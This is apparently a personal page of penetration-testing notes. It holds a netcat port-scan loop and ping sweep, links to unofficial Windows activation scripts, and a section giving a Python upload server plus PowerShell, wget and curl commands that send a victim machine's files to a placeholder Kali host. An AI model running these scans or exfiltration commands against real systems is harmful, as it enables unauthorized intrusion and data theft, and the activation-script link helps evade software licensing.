---
layout: blank
pagetitle: Miscellaneous Notes
---

We have nmap at home
- `for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done`
  - For a more basic ping sweep:
    - `for /l %i in (1,1,254) do @ping {IP/24}.%i -w 1 -n 1`

Mount a Windows vhd:
- `sudo apt install libguestfs-tools`
- `guestmount --add {vhd_file} --inspector --ro -v /mnt/{dir_to_mount_to}`
  - `-ro` is readonly

- Activate Windows with [https://github.com/massgravel/Microsoft-Activation-Scripts](https://github.com/massgravel/Microsoft-Activation-Scripts)
  - Uses [https://get.activated.win/](https://get.activated.win/)
- Use [https://uupdump.net/](https://uupdump.net/) to make Windows images (uses Microsoft servers so we get base images without all of the bloat)

Exfiltrate files off of a Windows system `sudo python3 app.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)

```python
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import os

class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Get the filename from the POST headers if provided
        filename = self.headers.get('filename', 'upload.bin')

        # Save the uploaded file
        with open(filename, 'wb') as f:
            f.write(post_data)

        # Send a response back to the client
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'File uploaded successfully')

if __name__ == "__main__":
    server_address = ('0.0.0.0', 8080)  # Use any port you want
    httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
    print(f"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)")
    httpd.serve_forever()
```
Then on Windows:
`Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`

Similarly on Linux:
`wget --method=POST --header="filename: {filename}" --body-file="{filename}" http://{kali_IP}:8080/upload`
or 
`curl -X POST -H "filename: {filename}" --data-binary "@{filename}" http://{kali_IP}:8080/upload`